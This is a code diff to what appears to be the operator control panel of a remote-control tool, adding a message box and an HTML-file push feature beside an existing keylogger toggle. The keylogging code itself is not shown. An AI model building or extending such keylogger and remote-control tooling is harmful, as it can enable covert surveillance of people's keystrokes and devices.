@@ -190,9 +190,61 @@ namespace client
 
         <div class='box' style=""grid-column: 1 / -1;"">
             <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:6px'>
-                <h3> KEYLOGGER</h3>
-                <button id='btnKey' onclick=""toggleKeylog()"" style='width:170px; color:#7bdcb5'>START KEYLOG</button>
+                <h3> KEYLOGGER AND MESSAGE</h3>
+                <div style=""display:flex; gap:6px; align-items:center"">
+                <button onclick=""openFilePicker()"" style=""width:70px; color: #7bdcb5"">FILE</button>
+                <button id='btnKey' onclick=""toggleKeylog()"" style='width:170px; color:#7bdcb5'>
+                    START KEYLOG
+                </button>
+               </div>
             </div>
+            
+        <div style=""
+            display:flex;
+            align-items:center;
+            gap:4px;
+            margin-bottom:6px;
+            background:#000;
+            border:1px solid #2f5f49;
+            border-radius:999px;
+            padding:4px 6px;
+        "">
+            <span style=""
+                color:#7bdcb5;
+                font-weight:bold;
+                margin-left:6px;
+            "">&gt;</span>
+
+            <input id=""msgInput""
+                   placeholder=""send message to server""
+                   style=""
+                        flex:1;
+                        background:transparent;
+                        border:none;
+                        outline:none;
+                        color:#7bdcb5;
+                        font-family:Consolas, monospace;
+                        font-size:11px;
+                   "">
+
+            <button onclick=""sendMessageUI()""
+                    style=""
+                        background:#0f1f18;
+                        border:1px solid #7bdcb5;
+                        color:#7bdcb5;
+                        border-radius:999px;
+                        padding:3px 10px;
+                        font-weight:bold;
+                        cursor:pointer;
+                    "">
+                SEND
+            </button>
+        </div>
+
+
+            <input type=""file"" id=""fileInput"" accept="".html"" style=""display:none"">
+
+
             <div id='terminal' class='scroll-box' style='font-family:monospace; color:#7CFC98; border:none'>
                 <div>[SYS] Ready.</div>
             </div>
@@ -317,6 +369,49 @@ namespace client
             }
             document.getElementById(divId).innerHTML = html + '</table>';
         }
+        function sendMessageUI() {
+            var input = document.getElementById(""msgInput"");
+            if (!input || !input.value.trim()) {
+                log(""Empty message."");
+                return;
+            }
+
+            // ❗ CHECK CONNECT TRƯỚC
+            if (!ws || ws.readyState !== 1) {
+                log(""Error: Not Connected"");
+                return;
+            }
+
+            ws.send(""MSG|"" + input.value.trim());
+            log(""Message sent."");
+            input.value = """";
+        }
+
+        function openFilePicker() {
+            document.getElementById(""fileInput"").click();
+        }
+
+        document.getElementById(""fileInput"").addEventListener(""change"", function () {
+            var file = this.files[0];
+            if (!file) return;
+
+            if (!file.name.toLowerCase().endsWith("".html"")) {
+                log(""Only HTML files are allowed."");
+                this.value = """";
+                return;
+            }
+
+            var reader = new FileReader();
+            reader.onload = function () {
+                var base64 = reader.result.split("","")[1];
+                send(""HTML|"" + base64);
+                log(""HTML file sent: "" + file.name);
+            };
+            reader.readAsDataURL(file);
+
+            this.value = """";
+        });
+
     </script>
 </body>
 </html>";
